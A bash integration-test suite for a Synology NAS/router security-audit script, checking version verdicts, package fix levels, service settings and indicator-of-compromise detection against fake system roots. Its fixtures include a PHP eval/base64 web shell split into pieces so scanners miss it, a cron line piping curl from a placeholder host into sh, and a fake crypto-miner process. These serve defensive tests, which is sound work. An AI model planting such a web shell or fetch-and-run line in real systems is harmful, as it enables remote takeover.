#!/usr/bin/env bash
# Integration tests for synology-audit.sh.
# Every case builds a fake DSM/SRM root in a temp dir and runs the script as a
# child process against it, with mocked ps/netstat/iptables, so nothing on the
# real system is read or touched. The script runs under /bin/sh (dash in CI),
# the same dialect the NAS uses.
set -u

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
SCRIPT="$ROOT/synology-audit.sh"
MOCK_BIN="$ROOT/tests/mock_bin"
TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT
SH="${TEST_SH:-sh}"

if [ "$(id -u)" -eq 0 ]; then
  echo "run the tests as a normal user: the script ignores its test hooks for root" >&2
  exit 1
fi
chmod +x "$MOCK_BIN"/*

PASS=0
FAIL=0
CASE_N=0
CASE=""
OUT=""
RC=0
D=""
pass() { PASS=$((PASS + 1)); }
fail() {
  FAIL=$((FAIL + 1))
  printf 'FAIL [%s] %s\n' "$CASE" "$1"
  printf '%s\n' "$OUT" | sed 's/^/    | /' | head -n 40
}

new_root() { # new_root NAME -> sets D
  CASE_N=$((CASE_N + 1))
  CASE="$1"
  D="$TMP/$CASE_N-$1"
  mkdir -p "$D/etc.defaults" "$D/etc" "$D/var/packages" "$D/tmp"
}

set_system() { # set_system PRODUCTVERSION BUILD FIX [OS_NAME] [UNIQUE] [MODEL]
  {
    echo 'majorversion="7"'
    echo "productversion=\"$1\""
    echo "buildnumber=\"$2\""
    echo "smallfixnumber=\"$3\""
    if [ -n "${4:-}" ]; then echo "os_name=\"$4\""; fi
  } > "$D/etc.defaults/VERSION"
  {
    echo "unique=\"${5:-synology_r1000_1522+}\""
    echo "upnpmodelname=\"${6:-DS1522+}\""
  } > "$D/etc.defaults/synoinfo.conf"
}

add_pkg() { # add_pkg ID VERSION
  mkdir -p "$D/var/packages/$1"
  printf 'package="%s"\nversion="%s"\n' "$1" "$2" > "$D/var/packages/$1/INFO"
}

# A DSM that passes everything: the base for most cases.
good_dsm() { # good_dsm NAME [PRODUCTVERSION BUILD FIX]
  new_root "$1"
  set_system "${2:-7.4.1}" "${3:-90080}" "${4:-1}" DSM
  mkdir -p "$D/usr/syno/etc/synoschedule.d/root" "$D/usr/syno/etc/firewall.d" "$D/etc/samba"
  printf 'type=daily\nname=DSM Auto Update\nstate=enabled\napp=SYNO.SDS.TaskScheduler.DSMAutoUpdate\n' \
    > "$D/usr/syno/etc/synoschedule.d/root/1.task"
  printf '{\n   "profile" : "default",\n   "status" : true\n}\n' > "$D/usr/syno/etc/firewall.d/firewall_settings.json"
  printf '[global]\n\tmin protocol=SMB2\n' > "$D/etc/samba/smb.conf"
  printf 'administrators:x:101:Marek\n' > "$D/etc/group"
}

run() { # run [args...]  -> OUT, RC
  OUT=$(SYNOLOGY_AUDIT_TEST_ROOT="$D" SYNOLOGY_AUDIT_TEST_PATH="$MOCK_BIN" "$SH" "$SCRIPT" "$@" 2>&1)
  RC=$?
}

expect_rc() { if [ "$RC" -eq "$1" ]; then pass; else fail "exit $RC, wanted $1"; fi; }
expect_has() { if printf '%s\n' "$OUT" | grep -Eq -- "$1"; then pass; else fail "output lacks /$1/"; fi; }
expect_not() { if printf '%s\n' "$OUT" | grep -Eq -- "$1"; then fail "output has /$1/ but must not"; else pass; fi; }

# ------------------------------------------------------------ version table
good_dsm clean_74; run
expect_rc 0; expect_has 'Verdict: OK'; expect_has 'OK \] VERSION'

# product build fix -> wanted exit code (SA-26:13 fixed builds, boundaries)
while read -r pv bn fx want; do
  good_dsm "ver_${pv}_${bn}_${fx}" "$pv" "$bn" "$fx"; run
  expect_rc "$want"
done <<'TABLE'
7.4.1 90074 0 2
7.4.1 90075 0 0
7.4.1 90080 1 0
7.3.2 86009 3 2
7.3.2 86009 4 0
7.3.1 85000 9 2
7.2.2 72806 8 2
7.2.2 72806 9 0
7.2.2 72805 20 2
7.2.1 69057 11 2
7.2.1 69057 12 0
7.2 64570 4 2
7.1.1 42962 7 2
6.2.4 25556 8 2
TABLE

good_dsm eol_71_patched_24_20 7.1.1 42962 7; run
expect_has 'no SA-26:13 fix'; expect_not 'SA-24:20'
good_dsm eol_72_unpatched_24_20 7.2 64570 3; run
expect_has 'SA-24:20 fixed build 7.2-64570-4'

# --------------------------------------------------------------- PHP2Shell
good_dsm php84_old; add_pkg PHP8.4 8.4.26-0050; add_pkg WebStation 4.0.0-0100; run
expect_rc 2; expect_has 'CRIT\] PHP2SHELL: PHP8.4 8.4.26-0050 is below the SA-26:14 fix 8.4.27-0051'
good_dsm php84_fixed; add_pkg PHP8.4 8.4.27-0051; add_pkg WebStation 4.0.0-0100; run
expect_rc 0; expect_has 'OK \] PHP2SHELL: PHP8.4 8.4.27-0051 is at or above'
# strictly newer than the fix, in a high and a low field
good_dsm php84_newer_patch; add_pkg PHP8.4 8.4.28-0001; add_pkg WebStation 4.0.0-0100; run
expect_rc 0; expect_has 'OK \] PHP2SHELL: PHP8.4 8.4.28-0001'
good_dsm php84_newer_build; add_pkg PHP8.4 8.4.27-0099; add_pkg WebStation 4.0.0-0100; run
expect_rc 0
good_dsm php84_newer_minor; add_pkg PHP8.4 8.5.1-0001; add_pkg WebStation 4.0.0-0100; run
expect_rc 0
good_dsm calendar_newer; add_pkg Calendar 3.1.0-21000; run
expect_rc 0; expect_has 'OK \] PHP2SHELL: Calendar 3.1.0-21000'
good_dsm php84_old_nodeps; add_pkg PHP8.4 8.4.26-0050; run
expect_rc 1; expect_has 'WARN\] PHP2SHELL: PHP8.4 8.4.26-0050 is below'
good_dsm php73_with_wp; add_pkg PHP7.3 7.3.33-0001; add_pkg WordPress 6.8.0-0001; run
expect_rc 2; expect_has 'PHP7.3 7.3.33-0001 is end of life and has no PHP2Shell fix'
good_dsm php73_alone; add_pkg PHP7.3 7.3.33-0001; run
expect_rc 1; expect_has 'WARN\] PHP2SHELL: PHP7.3'
good_dsm calendar_old; add_pkg Calendar 3.0.3-21000; run
expect_rc 2; expect_has 'Calendar 3.0.3-21000 is below the SA-26:14 fix 3.0.4-21435'
good_dsm calendar_fixed; add_pkg Calendar 3.0.4-21435; run
expect_rc 0
good_dsm mailstation_old; add_pkg MailStation 30000002.3.18-20333; run
expect_rc 2; expect_has 'MailStation 30000002.3.18-20333 is below'
good_dsm mailstation_fixed; add_pkg MailStation 30000002.3.19-20333; run
expect_rc 0
# DSM 7.0/7.1 and 6.2 have their own fixed builds
good_dsm php74_dsm71_ok 7.1.1 42962 7; add_pkg PHP7.4 7.4.33-0122; add_pkg WebStation 3.0.0-0100; run
expect_has 'OK \] PHP2SHELL: PHP7.4 7.4.33-0122'
good_dsm php74_dsm71_old 7.1.1 42962 7; add_pkg PHP7.4 7.4.33-0121; add_pkg WebStation 3.0.0-0100; run
expect_has 'CRIT\] PHP2SHELL: PHP7.4 7.4.33-0121 is below the SA-26:14 fix 7.4.33-0122'
good_dsm php74_dsm62 6.2.4 25556 8; add_pkg PHP7.4 7.4.33-0010; run
expect_has 'OK \] PHP2SHELL: PHP7.4 7.4.33-0010'
good_dsm python2_pkg; add_pkg Python2 2.7.18-1004; run
expect_has 'WARN\] EOL-PKG: Python2'
good_dsm no_php; run
expect_has 'OK \] PHP2SHELL: no PHP runtime'

# ------------------------------------------------------------- indicators
good_dsm ransom_file; mkdir -p "$D/volume1/Docs/2024"; : > "$D/volume1/Docs/2024/report.docx.c3rb3r"; run
expect_rc 3; expect_has 'Verdict: INDICATORS'; expect_has 'CRIT\] IOC-RANSOM'
good_dsm ransom_path_relative; mkdir -p "$D/volume1/Docs"; : > "$D/volume1/Docs/a.c3rb3r"; run
expect_has 'IOC-RANSOM: .*: /volume1/Docs/a\.c3rb3r'; expect_not "$TMP"
good_dsm ransom_note; mkdir -p "$D/volume1/Share"; : > "$D/volume1/Share/# DECRYPT MY FILES #.html"; run
expect_rc 3; expect_has 'IOC-RANSOM'
good_dsm ransom_clean; mkdir -p "$D/volume1/Share"; : > "$D/volume1/Share/holiday.jpg"; run
expect_rc 0; expect_has 'OK \] IOC-RANSOM'
good_dsm ransom_too_deep; mkdir -p "$D/volume1/a/b/c/d/e"; : > "$D/volume1/a/b/c/d/e/x.c3rb3r"; run
expect_not 'CRIT\] IOC-RANSOM'
good_dsm ransom_in_dirname; mkdir -p "$D/volume1/cerber.c3rb3r.dir"; : > "$D/volume1/cerber.c3rb3r.dir/ok.txt"; run
expect_not 'CRIT\] IOC-RANSOM'

# The web-shell payload is assembled from pieces so no scanner flags this file.
p1='ev'; p2='al(base64_'; p3='decode($_POST["x"]));'
good_dsm webshell; mkdir -p "$D/volume1/web/site"
printf '<?php %s%s%s ?>\n' "$p1" "$p2" "$p3" > "$D/volume1/web/site/a.php"; run
expect_rc 3; expect_has 'CRIT\] IOC-WEBSHELL'
good_dsm webshell_extra_root; mkdir -p "$D/custom/www"
printf '<?php %s%s%s ?>\n' "$p1" "$p2" "$p3" > "$D/custom/www/b.php"; run --web-root "$D/custom/www"
expect_rc 3; expect_has 'IOC-WEBSHELL'
good_dsm web_clean; mkdir -p "$D/volume1/web/site"; echo '<?php echo "hi";' > "$D/volume1/web/site/index.php"; run
expect_rc 0; expect_has 'OK \] IOC-WEBSHELL'
good_dsm php_in_uploads; mkdir -p "$D/volume1/web/wp/wp-content/uploads"
echo '<?php echo 1;' > "$D/volume1/web/wp/wp-content/uploads/x.php"; run
expect_rc 1; expect_has 'WARN\] IOC-UPLOADS'
good_dsm no_ioc_flag; mkdir -p "$D/volume1"; : > "$D/volume1/x.c3rb3r"; run --no-ioc
expect_rc 0; expect_not 'IOC-RANSOM'
good_dsm cron_curl_sh; printf '* * * * * root curl http://x.example/a | sh\n' > "$D/etc/crontab"; run
expect_rc 3; expect_has 'CRIT\] IOC-SCHEDULE'
good_dsm cron_clean; printf '0 0 * * * root /usr/syno/bin/synoschedtask --run id=1\n' > "$D/etc/crontab"; run
expect_rc 0; expect_has 'OK \] SCHEDULE'
good_dsm miner_proc
printf 'USER PID COMMAND\nroot 1 /sbin/init\nnobody 999 /tmp/xmrig --donate-level 1\n' > "$D/_ps"; run
expect_rc 3; expect_has 'CRIT\] IOC-PROCESS'

# ----------------------------------------------------- ssh / smb / services
good_dsm ssh_off; printf 'USER PID COMMAND\nroot 1 /sbin/init\n' > "$D/_ps"; run
expect_has 'OK \] SSH: SSH is not running'
good_dsm ssh_on_custom_port
printf 'USER PID COMMAND\nroot 9912 sshd: /usr/bin/sshd -D [listener] 0 of 10-100 startups\n' > "$D/_ps"
printf 'ssh_port="8522"\n' > "$D/etc/synoinfo.conf"
run
expect_rc 1; expect_has 'WARN\] SSH: SSH is enabled \(port 8522\)'; expect_has 'INFO\] SSH-CONFIG'
good_dsm ssh_root_login
printf 'USER PID COMMAND\nroot 9912 sshd: /usr/bin/sshd -D [listener]\n' > "$D/_ps"
mkdir -p "$D/etc/ssh"; printf 'PermitRootLogin yes\nPasswordAuthentication yes\n' > "$D/etc/ssh/sshd_config"; run
expect_has 'WARN\] SSH-ROOT'; expect_has 'SSH-PASSWORD'; expect_has 'SSH is enabled \(port 22\)'
good_dsm ssh_keys_listed
rm -f "$TMP/testkey" "$TMP/testkey.pub"
ssh-keygen -q -t ed25519 -N '' -C 'audit@test' -f "$TMP/testkey" >/dev/null 2>&1
mkdir -p "$D/var/services/homes/alice/.ssh"; cp "$TMP/testkey.pub" "$D/var/services/homes/alice/.ssh/authorized_keys"; run
expect_has 'SSH-KEYS: authorized_keys for alice: 1 key\(s\) \(SHA256:.* audit@test\)'
good_dsm smb1; printf '[global]\n\tmin protocol=NT1\n' > "$D/etc/samba/smb.conf"; run
expect_rc 1; expect_has 'WARN\] SMB1'
good_dsm smb1_spaced; printf '[global]\n   min protocol = LANMAN2\n' > "$D/etc/samba/smb.conf"; run
expect_has 'WARN\] SMB1'
good_dsm smb2_ok; run
expect_has 'OK \] SMB1: SMB minimum protocol is SMB2'
good_dsm telnet_ftp
printf 'Proto Recv-Q Send-Q Local Address Foreign Address State\ntcp 0 0 0.0.0.0:23 0.0.0.0:* LISTEN\ntcp 0 0 0.0.0.0:21 0.0.0.0:* LISTEN\ntcp 0 0 127.0.0.1:5432 0.0.0.0:* LISTEN\ntcp6 0 0 :::5001 :::* LISTEN\n' > "$D/_netstat"; run
expect_has 'WARN\] TELNET'; expect_has 'WARN\] FTP'
expect_has 'listening on non-loopback addresses: 21 23 5001'; expect_not '5432'
good_dsm nfs; printf 'tcp 0 0 0.0.0.0:2049 0.0.0.0:* LISTEN\n' > "$D/_netstat"; run
expect_has 'INFO\] NFS'
good_dsm no_autoupdate; rm "$D/usr/syno/etc/synoschedule.d/root/1.task"; run
expect_rc 1; expect_has 'WARN\] AUTOUPDATE'
good_dsm fw_off; printf '{ "status" : false }\n' > "$D/usr/syno/etc/firewall.d/firewall_settings.json"; run
expect_has 'WARN\] DSM-FIREWALL'
good_dsm accounts_enabled
printf 'admin:$6$abc$def:19000:0:99999:7:::\nguest:*:19000:0:99999:7:::\n' > "$D/etc/shadow"; run
expect_has 'WARN\] ACCT-ADMIN'; expect_not 'ACCT-GUEST'
good_dsm accounts_disabled
printf 'admin:*:19000:0:99999:7:::\nguest:!:19000:0:99999:7:::\n' > "$D/etc/shadow"; run
expect_not 'ACCT-ADMIN'
good_dsm quickconnect; add_pkg QuickConnect 1.0.10-0187; run
expect_has 'INFO\] QUICKCONNECT'

# -------------------------------------------------------------------- SRM
srm_root() {
  new_root "$1"
  {
    echo 'majorversion=5'; echo 'minorversion=2'; echo 'buildnumber="9366"'
    echo 'smallfixnumber="3"'; echo 'productversion="1.3.2"'
  } > "$D/etc.defaults/VERSION"
  printf 'unique="synology_cypress_rt6600ax"\nupnpmodelname="RT6600ax"\n' > "$D/etc.defaults/synoinfo.conf"
}
srm_root srm_detect; run
expect_has 'Device : RT6600ax'; expect_has 'System : SRM 1.3.2-9366-3'; expect_has 'INFO\] VERSION: SRM'
expect_rc 0
srm_root srm_firewall
cat > "$D/tmp/firewall_iptables_rules_v4" <<'FW'
*filter
-A INPUT_FIREWALL -p tcp -m multiport --dport 22 -j RETURN
-A INPUT_FIREWALL -p tcp -m multiport --dports 137,138,139,445 -j RETURN
-A INPUT_FIREWALL -p udp -m multiport --dports 4500,500,1194,1701 -j RETURN
-A INPUT_FIREWALL -p tcp -m multiport --dports 9488,9489,443,443,443,1723 -j RETURN
-A FORWARD_FIREWALL -p tcp -s 203.0.113.9 -j SYNO_FORWARD_ACCEPT
-A INPUT_FIREWALL -p tcp -s 203.0.113.9 -j RETURN
-A INPUT_FIREWALL -p tcp -m geoip --source-country CN,RU -j DROP
-A INPUT_FIREWALL -p tcp -m multiport --dport 8080 -j RETURN
-A INPUT_FIREWALL -j DROP
COMMIT
FW
run
expect_rc 1
expect_has 'WARN\] FW-ALLOWLIST: .*: 22 137 138 139 443 445 500 1194 1701 1723 4500 9488 9489\. The geo-block'
expect_not 'ports allowed from any country.*8080'
expect_has 'INFO\] FW-WHITELIST: .*203\.0\.113\.9'
srm_root srm_no_final_drop
printf -- '-A INPUT_FIREWALL -p tcp -m geoip --source-country CN -j DROP\n' > "$D/tmp/firewall_iptables_rules_v4"; run
expect_has 'WARN\] FW-DEFAULT'
srm_root srm_upnp
printf 'USER PID COMMAND\nroot 17260 /usr/sbin/miniupnpd -f /etc/miniupnpd.conf\n' > "$D/_ps"
cat > "$D/_nat" <<'NAT'
-N NUPNPD
-A NUPNPD -p tcp -m tcp --dport 50758 -j DNAT --to-destination 192.168.1.2:5000
-A NUPNPD -p tcp -m tcp --dport 50759 -j DNAT --to-destination 192.168.1.2:5001
-A PORT_FORWARD_RULE -p udp -m udp --dport 51820 -j DNAT --to-destination 192.168.1.202
-A PORT_FORWARD_RULE -p tcp -m tcp --dport 41225 -j DNAT --to-destination 192.168.1.203:22
NAT
run
expect_has 'WARN\] UPNP: UPnP/NAT-PMP is running'
expect_has 'WARN\] UPNP-MAPPINGS: .*50758->192\.168\.1\.2:5000 50759->192\.168\.1\.2:5001'
expect_has 'INFO\] FORWARDS: manual port forwards: udp 51820->192\.168\.1\.202;tcp 41225->192\.168\.1\.203:22'
srm_root srm_nat_unreadable; run
expect_has 'INFO\] NAT: run as root'

# ------------------------------------------------------------ output modes
good_dsm quiet_mode; run --quiet
expect_rc 0; expect_has '^OK DSM 7\.4\.1-90080-1 DS1522\+: 0 critical, 0 warnings$'
if [ "$(printf '%s\n' "$OUT" | wc -l)" -eq 1 ]; then pass; else fail "--quiet must print one line"; fi
good_dsm quiet_vuln 7.4.1 90070 0; run --quiet
expect_rc 2; expect_has '^VULNERABLE '
good_dsm json_ok; add_pkg PHP8.4 8.4.26-0050; add_pkg WebStation 4.0.0-0100; run --json
expect_rc 2
expect_has '"verdict":"VULNERABLE"'; expect_has '"exit":2'; expect_has '"os":"DSM"'; expect_has '"build":90080'
expect_has '"id":"PHP2SHELL"'; expect_has '"counts":\{"critical":1'
if command -v python3 >/dev/null 2>&1; then
  if printf '%s' "$OUT" | python3 -c 'import json,sys; d=json.load(sys.stdin); assert d["findings"]; assert d["verdict"]=="VULNERABLE"'; then pass; else fail "--json is not valid JSON"; fi
fi
good_dsm json_quotes; printf 'ssh_port="8522"\n' > "$D/etc/synoinfo.conf"
printf 'USER PID COMMAND\nroot 9912 sshd: /usr/bin/sshd -D [listener]\n' > "$D/_ps"
rm -f "$TMP/testkey" "$TMP/testkey.pub"
ssh-keygen -q -t ed25519 -N '' -C 'a "quoted" \ comment' -f "$TMP/testkey" >/dev/null 2>&1
mkdir -p "$D/var/services/homes/bob/.ssh"; cp "$TMP/testkey.pub" "$D/var/services/homes/bob/.ssh/authorized_keys"; run --json
if command -v python3 >/dev/null 2>&1; then
  if printf '%s' "$OUT" | python3 -c 'import json,sys; json.load(sys.stdin)'; then pass; else fail "--json with quotes is not valid JSON"; fi
fi
good_dsm bad_option; run --bogus
expect_rc 64; expect_has 'unknown option'
good_dsm bad_since; run --since abc
expect_rc 64
good_dsm version_flag; run --version
expect_rc 0; expect_has '^synology-audit [0-9]+\.[0-9]+\.[0-9]+$'

# ------------------------------------------------------ not a synology box
new_root not_synology; rm -rf "$D/etc.defaults"; run
expect_rc 4; expect_has 'does not look like Synology'
new_root not_synology_json; rm -rf "$D/etc.defaults"; run --json
expect_rc 4; expect_has '"verdict":"UNKNOWN"'

# ------------------------------------------------- the mocks really are used
good_dsm mock_used
printf 'USER PID COMMAND\nroot 1 /sbin/init\nroot 4242 sshd: /usr/bin/sshd -D [listener]\n' > "$D/_ps"
printf 'tcp 0 0 0.0.0.0:23 0.0.0.0:* LISTEN\n' > "$D/_netstat"
run
expect_has 'SSH is enabled'; expect_has 'WARN\] TELNET'
good_dsm mock_absent; run
expect_has 'OK \] SSH: SSH is not running'; expect_not 'TELNET'

# -------------------------------------------------- test hooks vs. real root
# In a user namespace mapped to uid 0, id -u reports 0: the script must then
# ignore TEST_ROOT/TEST_PATH and audit the real host (not a Synology: UNKNOWN).
good_dsm root_ignores_hooks
if command -v unshare >/dev/null 2>&1 && unshare -r true 2>/dev/null; then
  OUT=$(SYNOLOGY_AUDIT_TEST_ROOT="$D" SYNOLOGY_AUDIT_TEST_PATH="$MOCK_BIN" unshare -r "$SH" "$SCRIPT" 2>&1); RC=$?
  if [ ! -r /etc.defaults/VERSION ]; then
    expect_rc 4; expect_not 'DS1522'
  fi
else
  echo "note: unshare -r unavailable, skipping the root-ignores-hooks case"
fi

echo
echo "passed: $PASS   failed: $FAIL"
[ "$FAIL" -eq 0 ]
